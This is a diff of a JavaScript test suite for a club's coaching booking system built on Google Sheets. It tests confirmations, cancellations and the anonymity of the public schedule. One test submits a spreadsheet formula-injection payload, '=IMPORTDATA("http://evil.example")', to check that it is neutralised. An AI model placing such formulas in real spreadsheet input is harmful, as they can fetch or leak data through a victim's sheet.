@@ -169,11 +169,10 @@ const cell = (tab, line, name) => line[column(tab, name)];
 const requestRows = () => grids.Requests.slice(1);
 const requestBy = email => requestRows().filter(line => cell('Requests', line, 'student_email') === email);
 const weekday = date => new Date(date + 'T00:00:00Z').getUTCDay();
-// Everything on the public Sheet is readable by anyone: it may never carry a real name or an address.
+// Everything on the public Sheet is readable by anyone: first names only, never a full name, an address or a number.
+const PRIVATE = /@|example|555-\d{4}|\b(Abe|Ann|Bob|Cy|Dee|Hal|Sam|Pia|Tex|Uma|Wes|Xia|Late|Outage) (Coach|Student)\b|Pat Other|Lee Waits|Low Quota|Mail Fail|Quiet Failure|Quota Silent/;
 const assertPublicIsAnonymous = () => {
-  for (const word of JSON.stringify([grids.Schedule, grids.About]).match(/[A-Za-z@.]+/g)) {
-    assert.ok(!/@|example|^(Ann|Bob|Sam|Pat|Lee|Dee|Tex|Uma|Quiet|Flood|Fail|Quota)$/.test(word), 'public Sheet leaks: ' + word);
-  }
+  assert.doesNotMatch(JSON.stringify([grids.Schedule, grids.About]), PRIVATE, 'public Sheet leaks');
 };
 // The minute-by-minute trigger, without its 20 second and 10 minute throttles.
 const check = () => { delete cache['check-texts']; delete cache['verify-coaches']; context.checkTexts(); };
@@ -278,7 +277,7 @@ const ann = () => textsTo('Ann Coach');
 check();
 assert.equal(run('coachList').coaches[0].registered, true, "Ann's earlier text to the club number gives her the green check");
 assert.ok(cell('Coaches', coachRow(annId), 'registered_at'));
-assert.deepEqual(verifiedTo('Ann Coach'), ['CTTC: Thanks, you are verified as Coach A. To offer coaching times, open concordtabletennisclub.com/coaching.html, ' +
+assert.deepEqual(verifiedTo('Ann Coach'), ['CTTC: Thanks, you are verified as Coach Ann. To offer coaching times, open concordtabletennisclub.com/coaching.html, ' +
   'tap I am a coach and pick Coach A. We will text you here to confirm your times and lesson requests.'], 'told once, on her own thread');
 check();
 assert.equal(verifiedTo('Ann Coach').length, 1, 'and never again');
@@ -313,15 +312,15 @@ assert.equal(annAsked.ok, true);
 assert.equal(annAsked.message, 'Sent. Reply YES to the email and the text we just sent to publish these times, or NO to cancel. Nothing changes until you reply.');
 const annMail = mailTo('ann@example.com').pop();
 assert.match(annMail.subject, /^Confirm your coaching times \[CTTC ref [0-9A-F]{10}\]$/);
-assert.match(annMail.body, /Reply YES to this email to publish these changes to Coach A's coaching times/);
+assert.match(annMail.body, /Reply YES: Publish these changes to Coach Ann's coaching times\.\nReply NO: Cancel/);
 assert.match(annMail.body, /Add: Fri Oct 2 8:00-8:30 PM; Fri Oct 9 7:00-8:00 PM/);
 assert.match(annMail.body, /We also texted your mobile\. You can answer either one\./);
-assert.deepEqual(ann(), ['CTTC: Reply YES to update Coach A\'s coaching times, or NO to cancel. Add: Fri Oct 2 8:00-8:30 PM; Fri Oct 9 7:00-8:00 PM, 8:00-8:30 PM, ' +
+assert.deepEqual(ann(), ['CTTC: Reply YES to update Coach Ann\'s coaching times, or NO to cancel. Add: Fri Oct 2 8:00-8:30 PM; Fri Oct 9 7:00-8:00 PM, 8:00-8:30 PM, ' +
   '8:30-9:30 PM; Sat Oct 10 3:00-4:00 PM, 4:00-4:30 PM; Fri Oct 23 7:00-8:00 PM; Fri Oct 30 7:00-7:30 PM. Nothing changes until you reply.']);
 assert.equal(grids.Availability.length, 1, 'nothing is saved before the YES');
 assert.equal(run('coachBoard', annId).pending.length, 8, 'the page shows what is waiting for the YES');
 say('Ann Coach', 'YES');
-assert.equal(ann()[1], 'CTTC: Done. Coach A now has 8 upcoming coaching times (8 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
+assert.equal(ann()[1], 'CTTC: Done. Coach Ann now has 8 upcoming coaching times (8 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
 assert.equal(grids.Availability.length, 1 + 8);
 assert.equal(run('coachBoard', annId).pending, null);
 assert.match(propose(annId, annSet).message, /Nothing changed/, 'sending the same list again changes nothing');
@@ -333,21 +332,21 @@ assert.deepEqual(view.days.map(day => day.date), ['2026-10-02', '2026-10-03', '2
 assert.deepEqual(view.days.slice(0, 2).map(day => [day.start, day.end]), [['19:00', '22:00'], ['15:00', '18:00']]);
 assert.deepEqual([view.label, view.ready, view.tables, view.textNumber], ['Coach A', true, 3, '(925) 238-3505']);
 assert.equal(view.board.filter(entry => entry.mine).length, 8);
-assert.doesNotMatch(JSON.stringify([view, run('coachList')]), /@|example|Ann|555/, "the coach page never carries a coach's name, email or number");
+assert.doesNotMatch(JSON.stringify([view, run('coachList')]), PRIVATE, "the coach page never carries a coach's full name, email or number");
 
 const slots = run('openSlots').slots;
 assert.equal(slots.length, 7, "tonight's slot is under 24 hours away, so it is not offered");
 assert.deepEqual([slots[0].date, slots[0].start, slots[0].minutes, slots[1].start, slots[1].minutes], ['2026-10-09', '19:00', 50, '20:00', 25], 'a 60 minute time is a 50 minute lesson, a 30 minute time a 25 minute one');
 assert.equal(slots[0].label, 'Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time');
 assert.equal(slots[1].time, '8:00 PM to 8:25 PM');
-assert.ok(slots.every(entry => entry.coach === 'Coach A' && entry.table === 1), 'the public list shows only the label and table');
-assert.doesNotMatch(JSON.stringify(run('openSlots')), /@|example|Ann/, 'the public list shows no names or contact details');
+assert.ok(slots.every(entry => entry.coach === 'Coach Ann' && entry.table === 1), 'the public list shows only the first name and table');
+assert.doesNotMatch(JSON.stringify(run('openSlots')), PRIVATE, 'the public list shows first names only, and no contact details');
 assert.equal(Object.keys(slots[0]).sort().join(), 'coach,date,day,key,label,minutes,start,table,time');
 assert.equal(run('openSlots').sheetUrl, setupResult.publicSheet);
 
 // ---- The public Sheet mirrors the schedule with labels only ----
 assert.equal(grids.Schedule.length, 1 + 7);
-assert.deepEqual(grids.Schedule[1], ['2026-10-09', 'Friday', '7:00 PM', '7:50 PM', 'Coach A', 'Open', '', 'Coach A is available']);
+assert.deepEqual(grids.Schedule[1], ['2026-10-09', 'Friday', '7:00 PM', '7:50 PM', 'Coach Ann', 'Open', '', 'Coach Ann is available']);
 assertPublicIsAnonymous();
 
 // ---- Student requests: the time is held until the student replies YES to our email; only then is the coach asked ----
@@ -363,8 +362,8 @@ assert.equal(grids.Students.length, 1, 'and create no student label');
 sent.length = 0;
 const first = run('requestSlot', form(slots[0], { note: '=IMPORTDATA("http://evil.example")' }));
 assert.equal(first.ok, true);
-assert.equal(first.label, 'Student A');
-assert.equal(first.message, 'Almost done: we emailed you. Reply YES to that email within 2 hours to send your request to Coach A. The time is held for you until then. Nothing goes to the coach until you reply.');
+assert.equal(first.label, 'Student Sam');
+assert.equal(first.message, 'Almost done: we emailed you. Reply YES to that email within 2 hours to send your request to Coach Ann. The time is held for you until then. Nothing goes to the coach until you reply.');
 assert.equal(grids.Requests.length, 2);
 assert.equal(cell('Requests', grids.Requests[1], 'note'), 'IMPORTDATA("http://evil.example")', 'a note cannot start a spreadsheet formula');
 assert.equal(cell('Requests', grids.Requests[1], 'status'), 'unverified');
@@ -376,11 +375,18 @@ assert.deepEqual(sent.map(message => message.to), ['sam@example.com'], 'nothing 
 assert.equal(ann().length, 2);
 const verifyMail = mailTo('sam@example.com')[0];
 assert.match(verifyMail.subject, /^Confirm your coaching request \[CTTC ref [0-9A-F]{10}\]$/);
-assert.match(verifyMail.body, /Reply YES to this email to send your request for a lesson with Coach A on Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time at Table 1 to the coach, or NO to cancel it\./);
-assert.match(verifyMail.body, /You will show on the site as "Student A"/);
-assert.doesNotMatch(verifyMail.body, /Ann/);
+assert.match(verifyMail.body, /Action needed: reply to this email by [^\n]+\.\n\nReply YES: Send my request to the coach\.\nReply NO: Cancel my request and release the time\./);
+assert.match(verifyMail.body, /When: Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time\nWhere: Walnut Creek Christian Academy.*\nTable: Table 1\nCoach: Coach Ann/);
+assert.match(verifyMail.htmlBody, /<strong>Action needed:<\/strong>/);
+assert.match(verifyMail.htmlBody, /<td style="padding:3px 16px 3px 0;[^"]*">Table<\/td>/, 'the details are labelled in bold');
+assert.match(verifyMail.htmlBody, /<td[^>]*>Table 1<\/td><td[^>]*>Table 2<\/td>/, 'the day\'s tables are drawn');
+assert.match(verifyMail.htmlBody, /<td rowspan="2" style="[^"]*#fff3b0[^"]*"><strong>&#9733; YOUR LESSON<\/strong><br>Coach Ann \u00b7 7:00 PM to 7:50 PM<br><strong>Waiting for your YES/, 'with the student\'s time highlighted');
+assert.equal((verifyMail.htmlBody.match(/YOUR LESSON/g) || []).length, 1);
+assert.doesNotMatch(verifyMail.htmlBody.replace(/Sam Student/g, ''), PRIVATE);
+assert.match(verifyMail.body, /You will show on the site as "Student Sam"/);
+assert.doesNotMatch(verifyMail.body.replace(/sam@example\.com|Sam Student/g, ''), PRIVATE);
 assert.equal(run('openSlots').slots.length, 6, 'the time is held while we wait');
-assert.deepEqual(run('openSlots').schedule, [{ day: 'Friday, October 9, 2026', time: '7:00 PM to 7:50 PM', status: 'Requested', summary: 'Student A requested a session with Coach A' }]);
+assert.deepEqual(run('openSlots').schedule, [{ day: 'Friday, October 9, 2026', time: '7:00 PM to 7:50 PM', status: 'Requested', summary: 'Student Sam requested a session with Coach Ann' }]);
 // Only a YES or NO, from the address the request was made with, quoting the code, after the question, answers it.
 answerMail('sam@example.com', 'Maybe, is it the east door?', verifyMail.subject);
 answerMail('pat@example.com', 'YES', verifyMail.subject);
@@ -395,29 +401,30 @@ assert.deepEqual(sent.map(message => message.to.toLowerCase()).sort(), ['ann@exa
 const pendingStudent = mailTo('sam@example.com')[1];
 assert.match(pendingStudent.subject, /not confirmed yet/i);
 assert.match(pendingStudent.body, /NOT confirmed until the coach accepts/);
-assert.match(pendingStudent.body, /with Coach A on Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time/);
-assert.doesNotMatch(pendingStudent.body, /Ann/, 'the student does not learn the coach\'s name before the lesson is confirmed');
+assert.match(pendingStudent.body, /When: Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time\n[^]*Table: Table 1\nCoach: Coach Ann/);
+assert.match(pendingStudent.htmlBody, /Waiting for the coach/);
+assert.doesNotMatch(pendingStudent.body, /Ann Coach|ann@/, 'the student learns only the coach\'s first name before the lesson is confirmed');
 assert.doesNotMatch(pendingStudent.body, /Payment:|Arrival:/, 'instructions come only after acceptance');
 const pendingCoach = mailTo('ann@example.com')[0];
 assert.match(pendingCoach.subject, /^Lesson request from Sam Student \[CTTC ref [0-9A-F]{10}\]$/);
-assert.match(pendingCoach.body, /Sam Student \(Student A\) asked for/, 'the coach sees the student\'s name before accepting');
+assert.match(pendingCoach.body, /Sam Student asked for/, 'the coach sees the student\'s name before accepting');
 assert.doesNotMatch(pendingCoach.body, /sam@example/, 'but no contact details until the lesson is confirmed');
-assert.match(pendingCoach.body, /Reply YES to this email to confirm, or NO to decline/);
+assert.match(pendingCoach.body, /Reply YES: Confirm the lesson\.\nReply NO: Decline it\./);
 assert.match(pendingCoach.body, /We are also texting your mobile about it\. You can answer either one\./);
 assert.doesNotMatch(pendingCoach.body, /concordtabletennisclub\.com|script\.google/, 'a coach gets no link');
 // The coach is asked by text straight away, and a bare YES or NO answers it.
-assert.equal(ann()[2], 'CTTC: Lesson request from Sam Student (Student A): 50 min, Fri Oct 9, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.');
+assert.equal(ann()[2], 'CTTC: Lesson request from Sam Student: 50 min, Fri Oct 9, 7:00 PM, Table 1. Reply YES to confirm or NO to decline.');
 assert.equal(run('openSlots').slots.length, 6, 'a requested slot is held');
-assert.equal(grids.Schedule.find(line => line[5] === 'Requested')[7], 'Student A requested a session with Coach A');
+assert.equal(grids.Schedule.find(line => line[5] === 'Requested')[7], 'Student Sam requested a session with Coach Ann');
 assert.equal(grids.Schedule.filter(line => line[5] === 'Open').length, 6);
 assertPublicIsAnonymous();
 assert.equal(run('requestSlot', form(slots[0], { name: 'Pat Other', email: 'pat@example.com' })).ok, false, 'a second student cannot take the same slot');
 assert.equal(grids.Students.length, 2, 'and gets no label for it');
 const patFirst = book(form(slots[1], { name: 'Pat Other', email: 'pat@example.com' }));
-assert.equal(patFirst.label, 'Student B', 'but can take another');
+assert.equal(patFirst.label, 'Student Pat', 'but can take another');
 assert.equal(grids.Requests.length, 3);
 const patSecond = book(form(slots[2], { name: 'Pat Other', email: 'pat@example.com' }));
-assert.equal(patSecond.label, 'Student B', 'the same person keeps the same label');
+assert.equal(patSecond.label, 'Student Pat', 'the same person keeps the same name');
 assert.equal(grids.Students.length, 3);
 assert.equal(run('requestSlot', form(slots[3], { name: 'Pat Other', email: 'pat@example.com' })).ok, false, 'at most two waiting requests per student');
 assert.equal(ann().length, 3, 'one question at a time: the coach is not asked about Pat until Sam is answered');
@@ -431,8 +438,8 @@ assert.equal(grids.Availability.length, 1 + 8);
 
 // ---- Status visible on both sides, by label only ----
 assert.deepEqual(run('coachBoard', annId).board.filter(entry => entry.date === '2026-10-09').map(entry => [entry.start, entry.status, entry.student]),
-  [['19:00', 'requested', 'Student A'], ['20:00', 'requested', 'Student B'], ['20:30', 'requested', 'Student B']]);
-assert.doesNotMatch(JSON.stringify(run('openSlots')), /Sam|Pat|@/, "the page never shows a student's details");
+  [['19:00', 'requested', 'Student Sam'], ['20:00', 'requested', 'Student Pat'], ['20:30', 'requested', 'Student Pat']]);
+assert.doesNotMatch(JSON.stringify(run('openSlots')), PRIVATE, "the page never shows a student's full name or contact details");
 
 // ---- Acceptance: a YES from the coach's phone, once, with instructions for both ----
 sent.length = 0;
@@ -446,9 +453,9 @@ assert.equal(sent.length, 2, 'one email to each side');
 for (const message of sent) {
   assert.match(message.subject, /^Lesson confirmed/);
   assert.match(message.body, /Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time/, 'date, time and time zone');
-  assert.match(message.body, /Walnut Creek Christian Academy, 2336 Buena Vista Ave, Walnut Creek, CA 94597, Table 1/, 'location and table');
-  assert.match(message.body, /Coach: Ann Coach, ann@example\.com, \(925\) 555-0101 \(shown on the schedule as Coach A\)/, 'once confirmed, both sides get each other\'s contact details');
-  assert.match(message.body, /Student A with Coach A|Student A has session with Coach A/);
+  assert.match(message.body, /Where: Walnut Creek Christian Academy, 2336 Buena Vista Ave, Walnut Creek, CA 94597\nTable: Table 1/, 'location and table');
+  assert.match(message.htmlBody, /<a href="https:\/\/www\.google\.com\/maps\/search\/\?api=1&amp;query=Walnut%20Creek/, 'the address opens a map');
+  assert.match(message.body, /Student Sam with Coach Ann|Student Sam has session with Coach Ann/);
   assert.match(message.body, /Arrival: /);
   assert.match(message.body, /Payment: /);
   assert.match(message.body, /Guidelines: /);
@@ -457,15 +464,17 @@ for (const message of sent) {
 assert.notEqual(sent[0].to, sent[1].to);
 assert.match(mailTo('ann@example.com')[0].body, /Student: Sam Student, sam@example\.com/);
 assert.match(mailTo('ann@example.com')[0].body, /Need to cancel\? Reply to this email/);
-assert.match(mailTo('sam@example.com')[0].body, /To cancel or move it, open https:\/\/concordtabletennisclub\.com\/coaching\.html, tap your time \(shown as Student A\)/);
+assert.match(mailTo('sam@example.com')[0].body, /Coach: Ann Coach\n[^]*Email: ann@example\.com\nPhone: \(925\) 555-0101/, 'once confirmed, the student gets the coach\'s contact details');
+assert.match(mailTo('sam@example.com')[0].body, /1\. Open https:\/\/concordtabletennisclub\.com\/coaching\.html\n2\. Tap your time \(shown as Student Sam\)/);
+assert.match(mailTo('sam@example.com')[0].htmlBody, /YOUR LESSON[^]*<strong>Confirmed<\/strong>/);
 assert.doesNotMatch(mailTo('sam@example.com')[0].body, /pat@example|[?]t=/);
 assert.deepEqual(ann().slice(-2), [
-  'CTTC: Confirmed. Student A, 50 min lesson Fri Oct 9, 7:00 PM, Table 1, Walnut Creek Christian Academy, 2336 Buena Vista Ave, Walnut Creek, CA 94597. Student: Sam Student, sam@example.com.',
-  'CTTC: Lesson request from Pat Other (Student B): 25 min, Fri Oct 9, 8:00 PM, Table 1. Reply YES to confirm or NO to decline.'
+  'CTTC: Confirmed. Student Sam, 50 min lesson Fri Oct 9, 7:00 PM, Table 1, Walnut Creek Christian Academy, 2336 Buena Vista Ave, Walnut Creek, CA 94597. Student: Sam Student, sam@example.com.',
+  'CTTC: Lesson request from Pat Other: 25 min, Fri Oct 9, 8:00 PM, Table 1. Reply YES to confirm or NO to decline.'
 ], 'the coach gets the plan by text, then the next question');
 assert.ok(ann().every(body => !/[?]t=/.test(body)), 'never a link in a text');
-assert.deepEqual(run('openSlots').schedule[0], { day: 'Friday, October 9, 2026', time: '7:00 PM to 7:50 PM', status: 'Booked', summary: 'Student A has session with Coach A' });
-assert.equal(grids.Schedule.find(line => line[5] === 'Booked')[7], 'Student A has session with Coach A');
+assert.deepEqual(run('openSlots').schedule[0], { day: 'Friday, October 9, 2026', time: '7:00 PM to 7:50 PM', status: 'Booked', summary: 'Student Sam has session with Coach Ann' });
+assert.equal(grids.Schedule.find(line => line[5] === 'Booked')[7], 'Student Sam has session with Coach Ann');
 assertPublicIsAnonymous();
 const confirmedCount = sent.length + replies.length;
 context.sweep();
@@ -483,15 +492,15 @@ assert.equal(mailTo('pat@example.com').length, 1);
 assert.match(mailTo('pat@example.com')[0].subject, /not accepted/i);
 assert.equal(mailTo('ann@example.com').length, 0, 'the coach is not emailed about their own answer');
 assert.deepEqual(ann().slice(-2), [
-  'CTTC: Declined. Student B was told, and Fri Oct 9, 8:00 PM is open again.',
-  'CTTC: Lesson request from Pat Other (Student B): 50 min, Fri Oct 9, 8:30 PM, Table 1. Reply YES to confirm or NO to decline.'
+  'CTTC: Declined. Student Pat was told, and Fri Oct 9, 8:00 PM is open again.',
+  'CTTC: Lesson request from Pat Other: 50 min, Fri Oct 9, 8:30 PM, Table 1. Reply YES to confirm or NO to decline.'
 ]);
 assert.equal(run('openSlots').slots.length, 5, 'the declined slot is open again');
 sent.length = 0;
 say('Ann Coach', 'YES');
 assert.match(mailTo('pat@example.com')[0].subject, /^Lesson confirmed: 2026-10-09 20:30/);
 assert.equal(mailTo('ann@example.com').length, 1);
-assert.ok(grids.Schedule.some(line => line[0] === '2026-10-09' && line[5] === 'Booked' && line[7] === 'Student B has session with Coach A'));
+assert.ok(grids.Schedule.some(line => line[0] === '2026-10-09' && line[5] === 'Booked' && line[7] === 'Student Pat has session with Coach Ann'));
 const answered = ann().length;
 say('Ann Coach', 'YES');
 assert.equal(ann().length, answered, 'a YES with no question waiting does nothing');
@@ -508,7 +517,9 @@ assert.equal(sent.length, 0, 'nobody else can cancel it, and is not told whose t
 assert.deepEqual(run('studentChange', { key: samKey, action: 'cancel', contact: ' SAM@example.com ' }), generic, 'the owner gets the very same answer');
 assert.equal(sent.length, 1);
 assert.match(sent[0].subject, /^Confirm: cancel your lesson \[CTTC ref [0-9A-F]{10}\]$/);
-assert.match(sent[0].body, /Reply YES to this email to cancel Student A's lesson with Coach A on Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time, or NO to keep it\./);
+assert.match(sent[0].body, /Reply YES: Cancel the lesson and release the time\.\nReply NO: Keep the lesson as it is\./);
+assert.match(sent[0].body, /When: Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time[^]*Coach: Coach Ann/);
+assert.match(sent[0].htmlBody, /#fde2e1[^"]*"><strong>&#10005; TO BE CANCELLED<\/strong><br>Coach Ann \u00b7 7:00 PM to 7:50 PM/, 'the time to cancel is marked on the schedule');
 run('studentChange', { key: samKey, action: 'cancel', contact: 'sam@example.com' });
 assert.equal(sent.length, 1, 'asking again within ten minutes sends nothing more');
 assert.equal(statusOf('sam@example.com'), 'confirmed', 'nothing changes before the YES');
@@ -516,7 +527,7 @@ replyTo('sam@example.com', 'YES', /^Confirm: cancel your lesson/);
 assert.equal(statusOf('sam@example.com'), 'cancelled');
 assert.deepEqual(mailTo('ann@example.com').map(message => message.subject), ['Lesson cancelled by Sam Student']);
 assert.deepEqual(mailTo('sam@example.com').map(message => message.subject).slice(1), ['Coaching lesson cancelled']);
-assert.equal(ann()[ann().length - 1], 'CTTC: Student A cancelled the lesson on Fri Oct 9, 7:00 PM. The time is open again.');
+assert.equal(ann()[ann().length - 1], 'CTTC: Student Sam cancelled the lesson on Fri Oct 9, 7:00 PM. The time is open again.');
 assert.equal(run('studentChange', { key: samKey, action: 'cancel', contact: 'sam@example.com' }).ok, false, 'a cancelled lesson cannot be cancelled again');
 const cancelledCount = sent.length;
 context.sweep();
@@ -534,17 +545,18 @@ assert.ok(grids.Schedule.slice(1).every(line => line[5] === 'Open'));
   const sam = book(form(slots[0], { name: 'Sam Student', email: 'sam@example.com' }));
   replyTo('ann@example.com', 'yes', /^Lesson request from Sam Student/);
   assert.equal(statusOf('sam@example.com'), 'confirmed', "the coach's emailed YES confirms it");
-  assert.match(ann()[ann().length - 1], /^CTTC: Confirmed\. Student A, .*Student: Sam Student, sam@example\.com\.$/, 'and the text thread hears about it');
+  assert.match(ann()[ann().length - 1], /^CTTC: Confirmed\. Student Sam, .*Student: Sam Student, sam@example\.com\.$/, 'and the text thread hears about it');
   sent.length = 0;
   const from = keyOf('sam@example.com');
   const to = run('openSlots').slots.find(entry => entry.date === '2026-10-10');
   assert.equal(run('studentChange', { key: from, action: 'move', to: 'f'.repeat(16), contact: 'sam@example.com' }).ok, false, 'only to an open time');
   assert.equal(run('studentChange', { key: from, action: 'move', to: to.key, contact: 'sam@example.com' }).ok, true);
   assert.match(sent[0].subject, /^Confirm: move your lesson \[CTTC ref/);
-  assert.match(sent[0].body, /to Saturday, October 10, 2026, 3:00 PM to 3:50 PM Pacific Time with Coach A at Table 1/);
+  assert.match(sent[0].body, /Now: Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time, Coach Ann, Table 1\nNew time: Saturday, October 10, 2026, 3:00 PM to 3:50 PM Pacific Time, Coach Ann, Table 1/);
+  assert.match(sent[0].htmlBody, /&#10005; MOVING FROM[^]*&#8594; MOVING TO/, 'both times are marked, on their own days');
   replyTo('sam@example.com', 'No', /^Confirm: move your lesson/);
   assert.equal(statusOf('sam@example.com'), 'confirmed', 'NO keeps the lesson');
-  assert.match(mailTo('sam@example.com').pop().body, /OK, nothing changed\. Student A's lesson on Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time stays as it is\./);
+  assert.match(mailTo('sam@example.com').pop().body, /OK, nothing changed\. Student Sam's lesson on Friday, October 9, 2026, 7:00 PM to 7:50 PM Pacific Time stays as it is\./);
   clock += 11 * 60000;
   assert.equal(run('studentChange', { key: from, action: 'move', to: to.key, contact: 'sam@example.com' }).ok, true);
   replyTo('sam@example.com', 'YES', /^Confirm: move your lesson/);
@@ -552,10 +564,10 @@ assert.ok(grids.Schedule.slice(1).every(line => line[5] === 'Open'));
   assert.deepEqual([cell('Requests', old, 'status'), cell('Requests', old, 'cancelled_by'), cell('Requests', moved, 'status'), cell('Requests', moved, 'date')],
     ['cancelled', 'move', 'pending', '2026-10-10'], 'YES releases the old time and sends the new one to the coach');
   assert.ok(mailTo('ann@example.com').some(message => message.subject === 'Lesson cancelled by Sam Student' && /moved the lesson/.test(message.body)));
-  assert.match(ann()[ann().length - 1], /^CTTC: Lesson request from Sam Student \(Student A\): 50 min, Sat Oct 10, 3:00 PM/);
+  assert.match(ann()[ann().length - 1], /^CTTC: Lesson request from Sam Student: 50 min, Sat Oct 10, 3:00 PM/);
   replyTo('ann@example.com', 'NO', /^Lesson request from Sam Student/);
   assert.equal(statusOf('sam@example.com'), 'declined', "the coach's emailed NO declines it");
-  assert.equal(sam.label, 'Student A');
+  assert.equal(sam.label, 'Student Sam');
   assert.equal(run('openSlots').slots.length, 7);
 }
 
@@ -564,19 +576,20 @@ const lateSlot = run('openSlots').slots[0];
 sent.length = 0;
 const waiting = book({ key: lateSlot.key, name: 'Lee Waits', email: 'lee@example.com' });
 assert.equal(mailTo('lee@example.com').length, 2);
-assert.match(ann()[ann().length - 1], /^CTTC: Lesson request from Lee Waits \(Student C\)/);
+assert.match(ann()[ann().length - 1], /^CTTC: Lesson request from Lee Waits:/);
 assert.ok(grids.Availability.some(line => line[2] === '2026-10-02'), "tonight's slot is still stored");
 clock += hours(49);
-assert.equal(waiting.label, 'Student C');
+assert.equal(waiting.label, 'Student Lee');
 sent.length = 0;
 say('Ann Coach', 'YES');
 assert.equal(cell('Requests', requestBy('lee@example.com')[0], 'status'), 'expired', 'a late YES cannot confirm an expired request');
 assert.deepEqual(ann().slice(-2), [
   'CTTC: That lesson request is no longer waiting (it is expired), so nothing changed.',
-  'CTTC: The request from Student C for Fri Oct 9, 7:00 PM expired without an answer, so the time was released.'
+  'CTTC: The request from Student Lee for Fri Oct 9, 7:00 PM expired without an answer, so the time was released.'
 ]);
 assert.deepEqual(sent.map(message => message.to).sort(), ['ann@example.com', 'lee@example.com']);
 assert.ok(sent.every(message => /expired/i.test(message.subject)));
+assert.ok(sent.every(message => message.cc === 'owner@example.com'), 'the club is copied when a coach does not answer');
 context.sweep();
 assert.equal(sent.length, 2, 'expiry is announced once');
 assert.ok(!grids.Availability.some(line => line[2] === '2026-10-02'), 'a slot whose day has passed is dropped');
@@ -670,7 +683,7 @@ assert.equal(held, 0, 'the lock is always released');
   publish(bobId, 'Bob Coach', [slot('2026-10-16', '20:00', 30)]);
   assert.equal(mine(annId).length, annCount, "one coach cannot remove another's slot");
   publish(annId, 'Ann Coach', mine(annId).concat(slot('2026-10-16', '20:00', 30)));
-  assert.deepEqual(run('openSlots').slots.filter(entry => entry.date === '2026-10-16').map(entry => [entry.coach, entry.table]), [['Coach A', 2], ['Coach B', 1]],
+  assert.deepEqual(run('openSlots').slots.filter(entry => entry.date === '2026-10-16').map(entry => [entry.coach, entry.table]), [['Coach Ann', 2], ['Coach Bob', 1]],
     'two coaches can offer the same time; the second gets the next table');
   publish(bobId, 'Bob Coach', []);
   publish(annId, 'Ann Coach', mine(annId).filter(entry => entry.date !== '2026-10-16'));
@@ -689,7 +702,7 @@ assert.equal(held, 0, 'the lock is always released');
 context.sweep();
 assertPublicIsAnonymous();
 assert.ok(grids.Schedule.length > 1);
-assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) && (line[6] === '' || /^Student [A-Z]+$/.test(line[6]))), 'only labels, never names');
+assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z][a-z]+$/.test(line[4]) && (line[6] === '' || /^Student [A-Z][a-z]+$/.test(line[6]))), 'first names only');
 
 // ---- Texting through Google Voice: the handshake between a coach's phone and the site ----
 {
@@ -698,7 +711,7 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   const deeId = addCoach('Dee Coach', 'dee@example.com', '(925) 555-0142', false);
   assert.equal(coachRow(deeId)[5], 'Coach D', 'a coach is shown by the first letter of their first name');
   assert.deepEqual(run('coachList').coaches.map(coach => [coach.label, coach.ready, coach.registered]), [['Coach A', true, true], ['Coach B', true, true], ['Coach C', true, false], ['Coach D', true, false]]);
-  assert.doesNotMatch(JSON.stringify([run('coachList'), run('coachBoard', deeId)]), /555|@|Dee|Cy Coach/, "a coach's name and number never reach the page");
+  assert.doesNotMatch(JSON.stringify([run('coachList'), run('coachBoard', deeId)]), PRIVATE, "a coach's full name and number never reach the page");
   assert.deepEqual(['ready', 'email', 'text'].map(key => run('coachBoard', cyId)[key]), [true, true, false]);
 
   // A coach with only an email address confirms by email.
@@ -706,13 +719,13 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   assert.equal(cyAsked.message, 'Sent. Reply YES to the email we just sent to publish these times, or NO to cancel. Nothing changes until you reply.');
   assert.match(mailTo('cy@example.com').pop().body, /Want to confirm by text instead\? Ask the club to add your mobile number to the coach list\./);
   answerMail('cy@example.com', 'YES', askedBy('ann@example.com', /coaching times/));
-  assert.equal(run('openSlots').slots.filter(entry => entry.coach === 'Coach C').length, 0, "another coach's code does not publish Cy's list");
+  assert.equal(run('openSlots').slots.filter(entry => entry.coach === 'Coach Cy').length, 0, "another coach's code does not publish Cy's list");
   replyTo('cy@example.com', 'YES', /^Confirm your coaching times/);
-  assert.equal(run('openSlots').slots.filter(entry => entry.coach === 'Coach C').length, 1, 'her emailed YES publishes it');
-  assert.equal(mailTo('cy@example.com').pop().body.split('\n')[0], 'Done. Coach C now has 1 upcoming coaching time (1 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
+  assert.equal(run('openSlots').slots.filter(entry => entry.coach === 'Coach Cy').length, 1, 'her emailed YES publishes it');
+  assert.equal(mailTo('cy@example.com').pop().body.split('\n')[0], 'Done. Coach Cy now has 1 upcoming coaching time (1 added, 0 removed). Students can request them at concordtabletennisclub.com/coaching.html.');
   assert.equal(run('coachList').coaches.find(coach => coach.id === cyId).registered, false, 'an email-only coach can publish but gets no green check without a mobile and a text');
   const dee = () => textsTo('Dee Coach', '(925) 555-0142');
-  const deeLive = () => run('openSlots').slots.filter(entry => entry.coach === 'Coach D');
+  const deeLive = () => run('openSlots').slots.filter(entry => entry.coach === 'Coach Dee');
   const deeSet = [slot('2026-10-16', '19:00', 60), slot('2026-10-16', '20:00', 30)];
 
   // Voice can only answer someone who has texted the club number first; the email still goes.
@@ -724,19 +737,19 @@ assert.ok(grids.Schedule.slice(1).every(line => /^Coach [A-Z]+$/.test(line[4]) &
   inbound('Dee Coach', 'COACH', clock - 60000);
   inbound('Dee Coach', 'YES', clock - 30000);
   assert.equal(propose(deeId, deeSet).ok, true);
